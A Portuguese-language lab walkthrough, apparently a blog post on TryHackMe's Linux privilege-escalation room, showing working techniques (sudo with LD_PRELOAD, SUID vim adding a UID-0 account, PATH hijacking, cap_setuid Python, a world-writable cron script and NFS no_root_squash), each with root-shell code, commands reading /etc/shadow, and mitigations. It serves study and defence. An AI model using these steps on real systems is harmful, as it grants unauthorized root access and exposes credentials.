---
layout: post
title: "Linux Privilege Escalation - do sudo ao NFS"
description: "Walkthrough de Linux Privilege Escalation no TryHackMe: enumeração de sistema, usuário, rede e arquivos, seguido de sudo, SUID, PATH Hijacking, capabilities, Cron Jobs e NFS. Comandos explicados, dicas e troubleshooting."
date: 2026-10-09
categories: [walkthrough, pentest, linux, tryhackme]
tags: [linux, privilege-escalation, sudo, ld-preload, suid, path-hijacking, capabilities, cron, nfs, gtfobins, tryhackme]
---

<a id="topo"></a>

# Linux Privilege Escalation - do sudo ao NFS

## Introdução

Neste estudo, reuni os exercícios de **Linux Privilege Escalation** do TryHackMe para entender e aprender como configurações inseguras permitem que um usuário comum, como <code>john</code>, obtenha privilégios de <code>root</code>.

O ponto principal é **identificar qual permissão está errada, entender por que ela é perigosa e testar a hipótese**. Organizei os seis vetores que estudei, os comandos utilizados e as verificações que ajudam a entender o resultado.

> **Escopo:** os comandos foram usados em VMs autorizadas. Não execute alterações de autenticação, arquivos SUID ou compartilhamentos NFS em sistemas sem autorização. Os IPs das VMs são temporários e podem mudar após um reset.

### Índice

- [Enumeração inicial](#enumeracao)
  - [Enumeration: OS](#enum-os)
  - [Enumeration: User](#enum-user)
  - [Enumeration: Network](#enum-network)
  - [Enumeration: File](#enum-file)
- [Escalação de privilégios](#escalacao)
  - [Sudo, Apache2 e LD_PRELOAD](#sudo)
  - [SUID](#suid)
  - [PATH Hijacking](#path-hijacking)
  - [Capabilities](#capabilities)
  - [Cron Jobs](#cron)
  - [NFS e no_root_squash](#nfs)
- [Erros comuns e dúvidas](#duvidas)
- [Tabela de comandos e operadores](#comandos)
- [Glossário de siglas e conceitos](#glossario)
- [Mitigação e conclusão](#mitigacao)

---

<a id="enumeracao"></a>

## Enumeração inicial

Antes de pensar em um exploit, precisamos conhecer a máquina. **Enumeração** é exatamente isso: levantar informações e procurar configurações fora do padrão.

Em vez de sair executando várias ferramentas de uma vez, costumo começar com algumas perguntas:

- Qual é a versão do Linux?
- Quem sou eu e quais comandos posso executar?
- Quais serviços, portas e compartilhamentos existem?
- Quais arquivos e executáveis possuem permissões interessantes?

<a id="enum-os"></a>

### Enumeration: OS

~~~bash
uname -a
cat /etc/os-release
uname -r
ps aux | head
~~~

O <code>uname</code> mostra informações do sistema e do kernel; <code>/etc/os-release</code> ajuda a identificar a distribuição. <code>ps aux</code> lista processos, e <code>head</code> limita a saída às primeiras linhas.

Essas informações ajudam a entender o ambiente antes de pesquisar versões, serviços ou possíveis problemas de configuração.

<a id="enum-user"></a>

### Enumeration: User

~~~bash
id
whoami
groups
sudo -l
~~~

- <code>id</code> mostra [UID e GID](#conceito-uid), além dos grupos.
- <code>whoami</code> mostra o usuário efetivo.
- <code>groups</code> lista os grupos do usuário.
- <code>sudo -l</code> mostra quais programas podemos executar por meio do sudo e com quais condições.

Um detalhe importante: **poder usar um programa com sudo não significa ter autorização para todos os programas**.

<a id="enum-network"></a>

### Enumeration: Network

~~~bash
ip -br addr
ss -tuln
cat /etc/exports
~~~

O primeiro comando resume as interfaces e endereços IP. O <code>ss</code> mostra portas TCP/UDP em escuta, e <code>/etc/exports</code> permite verificar se o servidor disponibiliza diretórios via [NFS](#conceito-nfs).

Quando existe um servidor NFS no escopo, podemos enumerar seus compartilhamentos a partir da máquina atacante:

~~~bash
showmount -e <TARGET_IP>
~~~

O uso de <code>&lt;TARGET_IP&gt;</code> representa o IP da VM alvo, e não o IP da AttackBox.

<a id="enum-file"></a>

### Enumeration: File

Aqui encontramos muitas das pistas usadas nas próximas etapas.

**Binários SUID pertencentes ao root:**

~~~bash
find / -type f -user root -perm -4000 -printf '%p\n' 2>/dev/null
~~~

**Capabilities dos executáveis:**

~~~bash
getcap -r / 2>/dev/null
~~~

**Arquivos que meu usuário consegue modificar:**

~~~bash
find /opt /usr/local/bin /home -type f -writable -printf '%p\n' 2>/dev/null
~~~

**Diretórios graváveis:**

~~~bash
find / -type d -writable -printf '%p\n' 2>/dev/null | sort -u
~~~

Para ter uma saída menor durante a investigação, podemos limitar a busca:

~~~bash
find /usr/bin /usr/local/bin -type f -user root -perm -4000 -printf '%p\n' 2>/dev/null
~~~

E, quando aparecem dezenas de resultados de pacotes Snap:

~~~bash
find / -type f -user root -perm -4000 -printf '%p\n' 2>/dev/null | grep -v '^/snap/'
~~~

**Dica:** começar com uma busca curta é ótimo, mas sempre amplie quando não encontrar nada. Em uma das VMs, o executável vulnerável estava em <code>/opt/path/mywhoami</code>, fora dos diretórios pesquisados inicialmente.

Para consultar o potencial de abuso de um executável encontrado, uso o [GTFOBins](https://gtfobins.github.io/), que organiza técnicas por categorias como sudo, SUID e capabilities.

[↑ Voltar ao índice](#topo)

---

<a id="escalacao"></a>

## Escalação de privilégios

Depois da enumeração, o desafio é entender **qual configuração permite fazer algo que o usuário comum não deveria conseguir**. Cada VM explorou uma situação diferente.

<a id="sudo"></a>

### Privilege Escalation: Sudo, Apache2 e LD_PRELOAD

No Linux, <code>sudo</code> permite executar comandos como outro usuário, normalmente root. Isso é útil na administração do sistema, mas pode se tornar perigoso se programas poderosos forem liberados sem restrição.

Na VM <code>sudo-box</code>, executei:

~~~bash
sudo -l
~~~

E encontrei:

~~~text
User john may run the following commands on sudo-box:
    (ALL) NOPASSWD: /usr/bin/nano
    (ALL) NOPASSWD: /usr/sbin/apache2

Matching Defaults entries:
    env_keep+=LD_PRELOAD
~~~

Ou seja: podia executar Nano e Apache2 como root sem senha. A configuração também preservava <code>LD_PRELOAD</code>.

#### Ler arquivo protegido com Nano

Como o Nano estava liberado, bastava usar:

~~~bash
sudo /usr/bin/nano -v /etc/shadow
~~~

O <code>-v</code> abre em modo de visualização. O <code>/etc/shadow</code> armazena informações protegidas de autenticação, incluindo hashes de senha quando existem.

#### Apache2: leitura indireta por mensagem de erro

O Apache possui a opção <code>-f</code>, que define um arquivo alternativo de configuração. Se indicarmos um arquivo que não contém diretivas Apache, ele tentará interpretá-lo e poderá revelar partes do conteúdo no erro.

~~~bash
sudo /usr/sbin/apache2 -C "LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so" -f /etc/shadow
~~~

Resultado:

~~~text
AH00526: Syntax error on line 1 of /etc/shadow:
Invalid command 'root:*:18561:0:99999:7:::'
~~~

Aqui o Apache **conseguiu ler a primeira linha**, mas não conseguiu interpretá-la como configuração. O asterisco no campo da senha de root indica que não havia ali um hash de senha utilizável. Portanto, ler essa linha não significou recuperar a senha de root.

#### LD_PRELOAD: biblioteca carregada antes do programa

O <code>LD_PRELOAD</code> permite solicitar que o carregador dinâmico carregue uma biblioteca compartilhada antes das bibliotecas usuais do programa. Na administração comum isso pode servir para depuração ou testes; em uma regra sudo mal configurada, abre espaço para executar código com privilégios elevados.

**Código da biblioteca usada no laboratório:**

~~~c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void _init(void) {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
~~~

Para salvar o código no terminal sem abrir um editor, podemos usar <code>cat</code> com um *here-document*:

~~~bash
cat > shell.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void _init(void) {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF
~~~

O <code>cat</code> recebe o texto até a linha <code>EOF</code>, e o operador <code>&gt;</code> cria ou substitui <code>shell.c</code>. Para acrescentar conteúdo sem substituir o arquivo, usamos <code>&gt;&gt;</code>.

Agora compilamos a biblioteca compartilhada:

~~~bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
~~~

- <code>-fPIC</code>: gera código independente da posição na memória.
- <code>-shared</code>: cria uma biblioteca compartilhada, geralmente com extensão <code>.so</code>.
- <code>-o</code>: nome do arquivo final.
- <code>-nostartfiles</code>: não inclui os arquivos padrão de inicialização.

E executamos um programa autorizado pelo sudo, apontando para a biblioteca:

~~~bash
sudo LD_PRELOAD=/home/john/shell.so /usr/bin/nano
id
whoami
~~~

No laboratório, o resultado foi uma shell com <code>uid=0(root)</code>.

**O que aprendemos:** não basta um comando aparecer no <code>sudo -l</code>; é preciso entender o que ele permite fazer e quais variáveis o sudo preserva. Veja também [LD_PRELOAD](#conceito-ldpreload).

[↑ Voltar ao índice](#topo)

---

<a id="suid"></a>

### Privilege Escalation: SUID

O [SUID](#conceito-suid) permite que um executável rode com o UID efetivo de seu proprietário. Se o proprietário é root, o programa pode receber privilégios que nosso usuário não possui.

Isso é normal em alguns executáveis do sistema, mas **um editor genérico com SUID root é uma configuração especialmente perigosa**.

#### Encontrar o binário

Na VM <code>suid-box</code>:

~~~bash
find / -type f -user root -perm -4000 -printf '%p\n' 2>/dev/null | grep -v '^/snap/'
~~~

O arquivo que chamou atenção foi:

~~~text
/usr/bin/vim.basic
~~~

Confirmei:

~~~bash
ls -l /usr/bin/vim.basic
~~~

~~~text
-rwsr-xr-x 1 root root 4126400 ... /usr/bin/vim.basic
~~~

O <code>s</code> no lugar do <code>x</code> das permissões do proprietário indica que o SUID está ativo.

#### Entender o /etc/passwd

O arquivo <code>/etc/passwd</code> contém informações das contas Linux, como nome, UID, GID, diretório pessoal e shell. Seu formato é:

~~~text
usuario:senha-ou-indicador:UID:GID:comentario:home:shell
~~~

Exemplo:

~~~text
root:x:0:0:root:/root:/bin/bash
~~~

O <code>x</code> costuma indicar que o hash de senha está armazenado em <code>/etc/shadow</code>. Já o **UID 0** identifica a conta com privilégios de root.

Na room, o objetivo era adicionar uma conta de laboratório com UID 0 usando o editor que tinha SUID.

#### Gerar o hash da senha

~~~bash
openssl passwd -1 -salt THM password1
~~~

Resultado:

~~~text
$1$THM$WnbwlliCqxFRQepUTCkUT1
~~~

O <code>-1</code> seleciona MD5-crypt, um formato antigo e inadequado para senhas em produção. <code>THM</code> é o *salt* e <code>password1</code> é a senha escolhida.

**Gerar um hash não cria o usuário.** Ele é apenas uma parte dos dados de autenticação.

#### Editar a conta de laboratório

Abra o binário que realmente tinha SUID:

~~~bash
/usr/bin/vim.basic /etc/passwd
~~~

No Vim, vá ao fim do arquivo com <code>G</code>, crie uma nova linha com <code>o</code> e acrescente a entrada fornecida no exercício:

~~~text
hacker:$1$THM$WnbwlliCqxFRQepUTCkUT1:0:0:root:/root:/bin/bash
~~~

Pressione <code>Esc</code>, use <code>:wq</code> para salvar e sair, e confirme que a conta existe:

~~~bash
getent passwd hacker
~~~

Por fim:

~~~bash
su hacker
~~~

A senha escolhida era <code>password1</code>. Confirmei:

~~~text
uid=0(root) gid=0(root) groups=0(root)
root
~~~

A técnica funcionou porque o editor conseguiu alterar um arquivo protegido. A nova conta compartilhou o UID 0 do root — não foi necessário descobrir a senha original.

[↑ Voltar ao índice](#topo)

---

<a id="path-hijacking"></a>

### Privilege Escalation: PATH Hijacking

O <code>PATH</code> é uma variável com os diretórios em que o Linux procura programas quando usamos um comando sem informar o caminho completo.

Por exemplo, ao executar <code>whoami</code>, o shell procura um programa com esse nome nos diretórios do PATH. Já <code>/usr/bin/whoami</code> aponta diretamente para o arquivo correto.

O **PATH Hijacking** acontece quando conseguimos colocar um executável controlado por nós em um diretório pesquisado antes do verdadeiro.

#### Identificar o programa vulnerável

No material da room, o exemplo usava um programa chamado <code>program</code> que procurava <code>thm</code>. Na VM real, esse arquivo não existia. A enumeração SUID revelou outro candidato:

~~~text
/opt/path/mywhoami
~~~

Investiguei assim:

~~~bash
ls -l /opt/path/mywhoami
file /opt/path/mywhoami
strings /opt/path/mywhoami | grep -E 'whoami|system|exec'
~~~

Saída relevante:

~~~text
-rwsr-xr-x 1 root root ... /opt/path/mywhoami
system
whoami
system@GLIBC_2.2.5
~~~

O <code>strings</code> extrai textos legíveis de arquivos binários. Ele não substitui uma análise completa do código, mas ajuda a identificar nomes de comandos e funções que merecem investigação.

Nesse caso, o comportamento indicava uma chamada equivalente a <code>system("whoami")</code> sem caminho absoluto.

#### Colocar /tmp no início do PATH

~~~bash
export PATH=/tmp:$PATH
echo "$PATH"
~~~

O <code>/tmp</code> é um diretório gravável. Colocando-o no início da lista, o programa pode encontrar primeiro um comando que criarmos ali.

#### Criar o executável correspondente

O programa real procurava **whoami**, então foi esse nome que usamos:

~~~bash
printf '#!/bin/sh\n/bin/bash -p\n' > /tmp/whoami
chmod 755 /tmp/whoami
~~~

O <code>printf</code> cria o texto diretamente pelo terminal; <code>\n</code> insere quebras de linha. O Bash usa <code>-p</code> para preservar privilégios efetivos quando disponíveis.

#### Executar e conferir

~~~bash
/opt/path/mywhoami
id
/usr/bin/whoami
~~~

A VM confirmou:

~~~text
uid=0(root) gid=0(root) groups=0(root),1001(john)
root
~~~

**Detalhe interessante:** depois do hijacking, executar apenas <code>whoami</code> chamaria nosso script em <code>/tmp</code> outra vez. Por isso usei <code>/usr/bin/whoami</code> na verificação.

[↑ Voltar ao índice](#topo)

---

<a id="capabilities"></a>

### Privilege Escalation: Capabilities

As [Linux Capabilities](#conceito-capabilities) dividem alguns privilégios administrativos em permissões específicas. Em vez de dar todos os poderes de root a um programa, o administrador pode permitir apenas certas operações.

Por exemplo, <code>cap_net_raw</code> permite determinadas operações de rede; <code>cap_setuid</code> permite alterar o UID do processo.

#### Procurar capabilities

~~~bash
getcap -r / 2>/dev/null | grep -v '^/snap/'
~~~

Na <code>capabilities-box</code>, encontrei:

~~~text
/usr/bin/python3.12 cap_setuid=ep
~~~

O <code>cap_setuid</code> era o ponto principal. O <code>e</code> significa *effective* e o <code>p</code>, *permitted*: a capability estava disponível para o programa utilizar.

#### Executar usando o Python identificado

~~~bash
/usr/bin/python3.12 -c 'import os; os.setuid(0); os.execl("/bin/bash", "bash", "-p")'
~~~

- <code>-c</code> executa código Python informado diretamente.
- <code>import os</code> carrega funções do sistema operacional.
- <code>os.setuid(0)</code> altera o UID para 0 usando a capability.
- <code>os.execl()</code> substitui o processo pela shell Bash.

Confira com:

~~~bash
id
/usr/bin/whoami
~~~

O importante aqui é verificar **qual executável recebeu a capability**. Neste ambiente ela pertencia ao Python, portanto não fazia sentido copiar literalmente um exemplo de Vim apresentado em outro material.

[↑ Voltar ao índice](#topo)

---

<a id="cron"></a>

### Privilege Escalation: Cron Jobs

O **Cron** é o agendador de tarefas do Linux. É muito usado para backups, limpeza de arquivos, manutenção e outras rotinas automáticas.

O problema aparece quando uma tarefa é executada pelo root, mas chama um script que um usuário comum consegue editar.

#### Procurar tarefas agendadas

~~~bash
cat /etc/crontab
ls -la /etc/cron.d /etc/cron.* 2>/dev/null
~~~

Na <code>cron-box</code>, encontrei o arquivo <code>/etc/cron.d/cleanup</code>:

~~~bash
cat /etc/cron.d/cleanup
~~~

~~~text
SHELL=/bin/bash
PATH=/home/ubuntu:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

* * * * * root /usr/local/bin/cleanup.sh
~~~

Os cinco asteriscos representam minuto, hora, dia do mês, mês e dia da semana. Nesse caso, a tarefa é executada **a cada minuto**, como <code>root</code>.

#### Verificar permissões e conteúdo

~~~bash
ls -l /usr/local/bin/cleanup.sh
cat /usr/local/bin/cleanup.sh
namei -l /usr/local/bin/cleanup.sh
~~~

Resultado:

~~~text
-rwxrwxrwx 1 root root ... /usr/local/bin/cleanup.sh
~~~

O script fazia limpeza de arquivos antigos:

~~~bash
#!/bin/bash
find /tmp -type f -mtime +1 -delete
find /var/tmp -type f -mtime +7 -delete
echo "[cleanup] done at $(date)"
~~~

A permissão <code>777</code> significava que qualquer usuário poderia modificar o script. Já o <code>namei -l</code> é útil para ver as permissões de cada componente do caminho.

#### Acrescentar o teste ao script

Primeiro guardei o original:

~~~bash
cp /usr/local/bin/cleanup.sh ~/cleanup.sh.bak
~~~

Depois adicionei o comando de demonstração sem apagar as instruções de limpeza:

~~~bash
printf '\ncp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash\n' >> /usr/local/bin/cleanup.sh
~~~

O <code>&gt;&gt;</code> acrescenta uma linha no final do script. Na próxima execução da tarefa, o processo root cria uma cópia do Bash e configura seu SUID.

Após a execução agendada, confira:

~~~bash
ls -l /tmp/rootbash
~~~

Se o arquivo for criado pelo root com SUID, as permissões devem começar com <code>-rws</code>.

Para testar no laboratório:

~~~bash
/tmp/rootbash -p
id
~~~

A causa da vulnerabilidade é simples: **um arquivo modificável por usuários comuns não deve ser executado automaticamente como root**.

[↑ Voltar ao índice](#topo)

---

<a id="nfs"></a>

### Privilege Escalation: NFS e no_root_squash

O **NFS (Network File System)** permite compartilhar diretórios pela rede, como se uma pasta de outro computador estivesse conectada ao nosso Linux.

É usado normalmente para compartilhar arquivos entre servidores, máquinas de trabalho, ambientes de desenvolvimento e sistemas de backup.

O comando **mount** conecta um sistema de arquivos a um diretório local. Por exemplo, podemos montar um compartilhamento remoto em <code>/mnt/nfs-thm</code>: a partir daí, os arquivos gravados nesse diretório aparecem também no compartilhamento do servidor.

Por isso, nesse exercício **não precisamos de Netcat nem Metasploit para enviar o executável**. O próprio NFS já faz essa troca de arquivos.

#### Identificar o compartilhamento vulnerável

Na VM alvo <code>nfs-box</code>:

~~~bash
cat /etc/exports
~~~

~~~text
/opt/nfs *(rw,sync,no_root_squash,no_subtree_check)
~~~

O arquivo <code>/etc/exports</code> define quais diretórios o servidor oferece pela rede e sob quais condições.

| Opção | Significado |
|---|---|
| <code>rw</code> | Permite leitura e escrita |
| <code>sync</code> | Confirma operações conforme a política síncrona de gravação |
| <code>no_root_squash</code> | Preserva a identidade UID 0 do root remoto |
| <code>no_subtree_check</code> | Dispensa verificações de subárvore |
| <code>*</code> | Aceita qualquer cliente segundo essa regra de exportação |

O detalhe perigoso é **no_root_squash**. Normalmente, o NFS pode mapear o root de um cliente para uma conta sem privilégios no servidor (*root_squash*). Aqui, esse mapeamento estava desativado.

#### Conferir os compartilhamentos pela AttackBox

Na sessão da room, as máquinas estavam assim:

| Máquina | IP usado | Função |
|---|---|---|
| AttackBox | <code>10.66.106.92</code> | Criar e colocar o arquivo no compartilhamento |
| nfs-box | <code>10.66.133.77</code> | Executar o arquivo |

Esses IPs são apenas exemplos da sessão e podem mudar.

Na AttackBox:

~~~bash
showmount -e 10.66.133.77
~~~

Resultado:

~~~text
Export list for 10.66.133.77:
/opt/nfs *
~~~

#### Montar o compartilhamento

Na **AttackBox**, com root:

~~~bash
mkdir -p /mnt/nfs-thm
mount -t nfs -o rw 10.66.133.77:/opt/nfs /mnt/nfs-thm
mount | grep nfs-thm
~~~

- <code>mkdir -p</code> cria o diretório local, se necessário.
- <code>-t nfs</code> informa o tipo de sistema de arquivos.
- <code>-o rw</code> solicita montagem com leitura e escrita.
- <code>IP:/opt/nfs</code> é o diretório compartilhado do alvo.
- <code>/mnt/nfs-thm</code> é onde acessamos esse diretório na AttackBox.

A partir desse ponto, o conteúdo colocado em <code>/mnt/nfs-thm</code> aparece na VM alvo em <code>/opt/nfs</code>.

#### Código para criar um executável privilegiado

O programa abaixo tenta assumir UID/GID 0 e abrir um Bash. Ele depende de ser executado por meio de um arquivo pertencente ao root com SUID.

~~~c
#include <unistd.h>

int main(void) {
    setgid(0);
    setuid(0);
    execl("/bin/bash", "bash", "-p", (char *)NULL);
    return 1;
}
~~~

Podemos criar o arquivo diretamente no terminal:

~~~bash
cat > /mnt/nfs-thm/nfs.c <<'EOF'
#include <unistd.h>

int main(void) {
    setgid(0);
    setuid(0);
    execl("/bin/bash", "bash", "-p", (char *)NULL);
    return 1;
}
EOF
~~~

**Dica:** nesse formato, o <code>cat</code> recebe as linhas até <code>EOF</code> e o <code>&gt;</code> grava o arquivo. Não é preciso abrir Nano ou Vim. Para adicionar conteúdo ao final de um arquivo existente, use <code>&gt;&gt;</code>.

#### Compilar e enviar pelo próprio NFS

É mais simples compilar localmente na AttackBox e depois copiar o binário pronto para a pasta montada:

~~~bash
gcc /mnt/nfs-thm/nfs.c -o /root/nfs2 -static
cp /root/nfs2 /mnt/nfs-thm/nfs2
chown root:root /mnt/nfs-thm/nfs2
chmod 4755 /mnt/nfs-thm/nfs2
sync
ls -l /mnt/nfs-thm/nfs2
~~~

O <code>-static</code> pede compilação com ligação estática. O <code>chown</code> define a propriedade como root, o <code>chmod 4755</code> ativa SUID e o <code>sync</code> solicita a gravação dos dados pendentes.

O resultado esperado é:

~~~text
-rwsr-xr-x 1 root root ... /mnt/nfs-thm/nfs2
~~~

**Lembrete:** confirme as permissões do mesmo arquivo que será executado. O <code>s</code> precisa aparecer no executável <code>nfs2</code>, não em outro arquivo.

#### Executar na nfs-box

Voltando ao terminal <code>john@nfs-box</code>:

~~~bash
ls -l /opt/nfs/nfs2
/opt/nfs/nfs2
id
whoami
~~~

A VM retornou:

~~~text
-rwsr-xr-x 1 root root 785768 ... /opt/nfs/nfs2
uid=0(root) gid=0(root) groups=0(root),1001(john)
root
~~~

**Root confirmado.** O arquivo criado pela AttackBox apareceu no servidor com proprietário root e SUID, permitindo que o usuário <code>john</code> executasse o programa com privilégios administrativos.

[↑ Voltar ao índice](#topo)

---

<a id="duvidas"></a>

## Erros comuns e dúvidas

Durante os exercícios, alguns detalhes pequenos fizeram bastante diferença. Reuni aqui os que valem lembrar em outros laboratórios.

| Situação | O que aconteceu / como resolver |
|---|---|
| <code>sudo find</code> pediu senha e foi negado | Copiei o comando de um exemplo, mas o <code>sudo -l</code> autorizava apenas Nano e Apache2. Primeiro confira **o que realmente está permitido**. |
| GCC mostrou <code>implicit declaration of setuid</code> | Faltava <code>#include &lt;unistd.h&gt;</code>, onde são declaradas <code>setuid()</code> e <code>setgid()</code>. |
| <code>su hacker</code> dizia que o usuário não existia | Eu havia gerado apenas o hash; ainda precisava salvar a entrada completa no <code>/etc/passwd</code>. |
| <code>su THM</code> não funcionou | <code>THM</code> era o salt do hash, não o nome da conta. |
| A busca SUID não mostrou nada interessante | A busca limitada a <code>/usr/bin</code> não encontrava <code>/opt/path/mywhoami</code>. Amplie para <code>/</code> quando necessário. |
| Criei <code>/tmp/thm</code>, mas não era usado | O exemplo didático procurava <code>thm</code>; o programa real procurava <code>whoami</code>. |
| <code>whoami</code> deixou de imprimir o usuário | O comando havia sido substituído no PATH. Use <code>/usr/bin/whoami</code> para chamar o executável original. |
| <code>./vim: No such file or directory</code> | <code>./</code> procura no diretório atual. Além disso, a capability encontrada naquela VM estava no Python, não no Vim. |
| NFS não montava | Inicialmente usei o IP da AttackBox em vez do IP da nfs-box. O IP após <code>mount</code> deve ser o do servidor NFS. |
| <code>Text file busy</code> ao executar o binário NFS | O arquivo ainda podia estar aberto para escrita. Compilei fora do NFS e depois copiei o binário pronto. |
| <code>nfs2</code> rodava, mas continuava como <code>john</code> | O <code>chmod 4755</code> havia sido aplicado ao antigo <code>nfs</code>, não ao <code>nfs2</code>. Conferir <code>ls -l</code> mostrou a diferença. |
| SUID está presente, mas o programa não eleva | Verifique proprietário, comportamento do programa, sistema de arquivos e restrições como <code>nosuid</code>. SUID sozinho não garante exploração. |

Se precisar examinar arquivos de contas sem modificá-los, estes dois comandos também ajudam:

~~~bash
# Contas com UID 0
awk -F: '$3 == 0 {print $1, $3, $4}' /etc/passwd

# Entradas sem os sete campos esperados
awk -F: 'NF != 7 {print NR, $0}' /etc/passwd
~~~

[↑ Voltar ao índice](#topo)

---

<a id="comandos"></a>

## Tabela de comandos e operadores

| Comando / operador | Para que serve | Exemplo |
|---|---|---|
| <code>id</code> | UID, GID e grupos | <code>id</code> |
| <code>whoami</code> | Nome associado ao UID efetivo | <code>/usr/bin/whoami</code> |
| <code>sudo -l</code> | Comandos autorizados pelo sudo | <code>sudo -l</code> |
| <code>uname -a</code> | Informações do sistema e kernel | <code>uname -a</code> |
| <code>ip -br addr</code> | Resumo dos IPs e interfaces | <code>ip -br addr</code> |
| <code>ss -tuln</code> | Portas TCP/UDP em escuta | <code>ss -tuln</code> |
| <code>find -type f</code> | Apenas arquivos regulares | <code>find /opt -type f</code> |
| <code>find -type d</code> | Apenas diretórios | <code>find /tmp -type d</code> |
| <code>-user root</code> | Arquivos pertencentes ao root | <code>find /opt -user root</code> |
| <code>-perm -4000</code> | Arquivos com bit SUID | <code>find / -perm -4000</code> |
| <code>-perm -2000</code> | Arquivos com bit SGID | <code>find / -perm -2000</code> |
| <code>-writable</code> | Arquivos/diretórios graváveis | <code>find /opt -writable</code> |
| <code>-printf '%p\n'</code> | Imprime um caminho por linha | <code>find /opt -printf '%p\n'</code> |
| <code>2&gt;/dev/null</code> | Oculta mensagens de erro | <code>find / 2&gt;/dev/null</code> |
| <code>&#124;</code> | Envia saída para o próximo comando | <code>ls &#124; grep log</code> |
| <code>grep -v</code> | Remove linhas correspondentes | <code>grep -v '^/snap/'</code> |
| <code>sort -u</code> | Ordena e remove duplicados | <code>sort -u</code> |
| <code>&gt;</code> | Cria ou substitui conteúdo | <code>printf 'a\n' &gt; teste</code> |
| <code>&gt;&gt;</code> | Acrescenta conteúdo | <code>printf 'b\n' &gt;&gt; teste</code> |
| <code>printf</code> | Escreve texto formatado | <code>printf 'linha\n'</code> |
| <code>chmod 755</code> | Permissões rwx/rx/rx | <code>chmod 755 script.sh</code> |
| <code>chmod 4755</code> | Ativa SUID e permissões 755 | <code>chmod 4755 binario</code> |
| <code>chown</code> | Muda proprietário e grupo | <code>chown root:root binario</code> |
| <code>./arquivo</code> | Executa arquivo do diretório atual | <code>./program</code> |
| <code>strings</code> | Extrai textos de um binário | <code>strings ./program</code> |
| <code>getcap -r</code> | Procura capabilities recursivamente | <code>getcap -r /</code> |
| <code>namei -l</code> | Examina permissões em cada nível do caminho | <code>namei -l /opt/script.sh</code> |
| <code>showmount -e</code> | Lista compartilhamentos NFS exportados | <code>showmount -e IP</code> |
| <code>mount -t nfs</code> | Monta diretório NFS remotamente | <code>mount -t nfs IP:/pasta /mnt/pasta</code> |
| <code>sync</code> | Solicita gravação de dados pendentes | <code>sync</code> |

### Entendendo permissões rapidamente

~~~text
-rwsr-xr-x  ← SUID ativo (s)
-rwxr-xr-x  ← executável comum (x)
-rwxrwxrwx  ← qualquer usuário pode ler, escrever e executar
~~~

O <code>chmod 4755</code> usa o primeiro dígito <code>4</code> para ativar SUID, enquanto <code>755</code> define permissões normais. Já <code>777</code> dá escrita a todos, **mas não ativa SUID**.

[↑ Voltar ao índice](#topo)

---

<a id="glossario"></a>

## Glossário de siglas e conceitos

| Termo | O que é e para que serve |
|---|---|
| <a id="conceito-uid"></a>**UID** (*User ID*) | Número que identifica a conta Linux. O UID 0 identifica root. |
| **EUID** (*Effective User ID*) | Identidade que o sistema considera nas verificações de permissão do processo. |
| **GID** (*Group ID*) | Número que identifica o grupo principal. |
| <a id="conceito-suid"></a>**SUID** (*Set User ID*) | Bit que permite executar um binário com o UID efetivo de seu proprietário. |
| **SGID** (*Set Group ID*) | Bit associado à identidade de grupo; seu efeito depende do tipo de arquivo. |
| **Sudo** | Ferramenta usada para executar comandos autorizados sob outra identidade. |
| **sudoers** | Regras que dizem quem pode usar sudo, em quais programas e condições. |
| <a id="conceito-ldpreload"></a>**LD_PRELOAD** | Variável que permite solicitar o carregamento antecipado de bibliotecas dinâmicas. |
| **.so** (*Shared Object*) | Arquivo de biblioteca compartilhada no Linux. |
| **GCC** (*GNU Compiler Collection*) | Ferramentas utilizadas para compilar código, como programas em C. |
| **ELF** (*Executable and Linkable Format*) | Formato comum de binários e bibliotecas Linux. |
| **PIC** (*Position-Independent Code*) | Código que funciona em diferentes endereços de memória. |
| **PATH** | Variável com os diretórios pesquisados para encontrar comandos. |
| **PATH Hijacking** | Manipulação da busca de comandos para executar outro programa com o mesmo nome. |
| <a id="conceito-capabilities"></a>**Linux Capabilities** | Permissões específicas do kernel, sem necessariamente conceder todos os privilégios do root. |
| **cap_setuid** | Capability que permite alterar o UID do processo. |
| <a id="conceito-cron"></a>**Cron** | Agendador de tarefas do Linux. |
| **Cron Job** | Tarefa executada automaticamente pelo Cron. |
| <a id="conceito-nfs"></a>**NFS** (*Network File System*) | Serviço usado para acessar arquivos e diretórios compartilhados pela rede. |
| **mount** | Comando que associa um sistema de arquivos a um diretório local. |
| **Export** | Diretório disponibilizado por um servidor NFS. |
| **root_squash** | Recurso NFS que mapeia o root remoto para uma identidade sem privilégios. |
| **no_root_squash** | Desativa esse mapeamento e pode permitir que o root remoto preserve UID 0. |
| **nosuid** | Opção de montagem que impede efeitos de SUID/SGID e certas capabilities de arquivos. |
| **Shell** | Programa de interpretação de comandos, como Bash ou sh. |
| **Hash** | Resultado de função unidirecional, usado também para verificar senhas. |
| **Salt** | Valor incorporado ao hashing de senhas para evitar resultados idênticos para senhas iguais. |
| **GTFOBins** | Catálogo de técnicas envolvendo binários Unix e permissões. |
| **ETXTBSY** (*Text file busy*) | Erro que pode acontecer ao executar um arquivo aberto para escrita. |

[↑ Voltar ao índice](#topo)

---

<a id="mitigacao"></a>

## Mitigação e conclusão

Depois de passar por essas VMs, uma coisa ficou clara: **uma configuração pequena e aparentemente inofensiva pode ser suficiente para entregar privilégios de root**.

| Técnica | Problema | Como evitar |
|---|---|---|
| Sudo e LD_PRELOAD | Permissões amplas e variáveis de ambiente perigosas | Restringir sudoers e revisar o ambiente preservado |
| SUID | Programa privilegiado com funções perigosas | Remover SUID desnecessário e auditar binários |
| PATH Hijacking | Busca de comandos em diretórios controláveis | Usar caminhos absolutos e PATH confiável |
| Capabilities | Permissão perigosa em interpretador genérico | Revisar e remover capabilities excessivas |
| Cron Jobs | Root executa script gravável por outros usuários | Corrigir proprietário, diretórios e permissões |
| NFS | Compartilhamento gravável com no_root_squash | Habilitar root_squash e limitar os clientes autorizados |

O caminho mental que funcionou melhor foi:

~~~text
Enumerar
   ↓
Encontrar algo incomum
   ↓
Verificar permissões e comportamento
   ↓
